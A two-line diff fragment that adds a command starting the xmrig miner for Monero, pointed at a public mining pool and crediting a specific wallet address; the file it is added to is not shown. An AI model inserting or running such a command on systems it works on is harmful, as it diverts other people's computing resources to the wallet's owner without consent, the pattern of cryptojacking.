@@ -1,0 +1,2 @@
+
+./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 86rQQecpLQeF6pQT4uLwEkHqY8wMMM18SfdVMLnC8butCCGQDaMtTUCKY63pD6e3R4RcwRo3GB9G6TqbNhfHf4ZVMiMGqiS -p x
